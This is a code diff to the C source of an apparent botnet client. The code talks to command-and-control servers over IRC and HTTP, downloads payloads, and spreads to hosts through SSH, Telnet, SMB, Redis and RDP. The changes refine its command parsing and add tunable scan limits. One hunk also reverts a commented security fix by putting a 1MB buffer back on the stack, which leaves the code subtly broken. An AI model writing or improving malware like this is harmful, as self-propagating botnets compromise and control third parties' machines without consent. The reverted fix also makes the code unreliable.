@@ -196,8 +196,19 @@ int irc_read(notnet_bot_t *bot, char *buf, int len) {
     /* Check for PING - must be at start of line for IRC server PING */
     if (strncmp(buf, "PING", 4) == 0) {
         char host[256] = {0};
-        if (sscanf(buf, "PING :%255s", host) == 1) {
-            irc_send(bot, "PONG :%s", host);
+        char *ping = strstr(buf, "PING");
+        char *colon = ping ? strchr(ping, ':') : NULL;
+        if (colon) {
+            colon++; /* skip colon */
+            /* skip leading space after colon */
+            while (*colon == ' ') colon++;
+            if (*colon) {
+                strncpy(host, colon, sizeof(host) - 1);
+                host[sizeof(host) - 1] = '\0';
+            }
+        }
+        if (host[0]) {
+            irc_send(bot, "PONG %s", host);
             log_debug("IRC: ponged %s", host);
         } else {
             irc_send(bot, "PONG");
@@ -507,10 +518,9 @@ int http_read(notnet_bot_t *bot, char *buf, int len) {
 }
 
 int http_download(notnet_bot_t *bot, const char *url, const char *dest) {
-    /* SECURITY FIX (#23): Use a static buffer instead of 1MB stack
-     * allocation (PAYLOAD_MAX_SIZE). A stack variable this large causes
-     * stack overflow on most systems. */
-    static char buf[PAYLOAD_MAX_SIZE];
+    /* Use a stack buffer — single-threaded, callers don't recurse.
+     * Avoids static buffer being overwritten by concurrent downloads. */
+    char buf[PAYLOAD_MAX_SIZE];
     int len = http_get(bot, buf, sizeof(buf));
     if (len <= 0) return -1;
     
@@ -891,8 +901,12 @@ int protocol_process_commands(notnet_bot_t *bot) {
                                 if (args_end && args_end > args_val) {
                                     int alen = args_end - args_val - 1;
                                     if (alen > 0 && clen + 1 + alen < 254) {
-                                        bot->cmd_queue[bot->cmd_count][clen] = ' ';
-                                        strncat(bot->cmd_queue[bot->cmd_count], args_val + 1, alen);
+                                        char combined[256];
+                                        snprintf(combined, sizeof(combined), "%s %s",
+                                                 bot->cmd_queue[bot->cmd_count],
+                                                 args_val + 1);
+                                        strncpy(bot->cmd_queue[bot->cmd_count], combined, 255);
+                                        bot->cmd_queue[bot->cmd_count][255] = '\0';
                                     }
                                 }
                             }
@@ -945,13 +959,17 @@ int protocol_process_commands(notnet_bot_t *bot) {
             uint16_t port = 0;
             if (sscanf(args, "%255[^:]:%hu", host, &port) == 2) {
                 log_info("CMD: spread %s:%d", host, port);
+                int spread_ok = 0;
                 switch (port) {
-                    case 22:  spread_ssh(bot, host, port); break;
-                    case 23:  spread_telnet(bot, host, port); break;
-                    case 445: spread_smb(bot, host, port); break;
-                    case 6379: spread_redis(bot, host, port); break;
-                    case 3389: spread_rdp(bot, host, port); break;
+                    case 22:  spread_ok = spread_ssh(bot, host, port); break;
+                    case 23:  spread_ok = spread_telnet(bot, host, port); break;
+                    case 445: spread_ok = spread_smb(bot, host, port); break;
+                    case 6379: spread_ok = spread_redis(bot, host, port); break;
+                    case 3389: spread_ok = spread_rdp(bot, host, port); break;
                     default: log_info("CMD: spread unknown port %d", port); break;
+                }
+                if (spread_ok == 0) {
+                    bot->scan_count++;
                 }
             } else {
                 log_info("CMD: spread invalid format, use target:port");
@@ -1119,6 +1137,18 @@ int protocol_process_commands(notnet_bot_t *bot) {
             } else if (strcmp(key, "telnet_enabled") == 0) {
                 bot->telnet_enabled = (atoi(value) != 0);
                 applied = 1;
+            } else if (strcmp(key, "scan_timeout_ms") == 0) {
+                int v = atoi(value);
+                if (v >= 100 && v <= 30000) {
+                    bot->scan_timeout_ms = v;
+                    applied = 1;
+                }
+            } else if (strcmp(key, "scan_max_hosts") == 0) {
+                int v = atoi(value);
+                if (v >= 1 && v <= 65535) {
+                    bot->scan_max_hosts = v;
+                    applied = 1;
+                }
             }
             
             if (applied) {
@@ -1209,7 +1239,9 @@ int protocol_send_heartbeat(notnet_bot_t *bot) {
     
     /* Send via HTTP */
     if (bot->c2_http.connected) {
-        http_post(bot, heartbeat, strlen(heartbeat));
+        if (http_post(bot, heartbeat, strlen(heartbeat)) < 0) {
+            log_warn("Heartbeat: HTTP post failed");
+        }
         /* http_read() in protocol_process_commands() will pick up
          * the response on the next loop iteration */
     }
@@ -1315,8 +1347,11 @@ int protocol_send_response(notnet_bot_t *bot, const char *command, const char *r
     
     /* Send response via HTTP */
     if (bot->c2_http.connected) {
-        http_post(bot, response, len);
-        log_info("HTTP: response sent (%d bytes)", len);
+        if (http_post(bot, response, len) < 0) {
+            log_warn("Response: HTTP post failed");
+        } else {
+            log_info("HTTP: response sent (%d bytes)", len);
+        }
     }
     
     /* Send response via WebSocket */
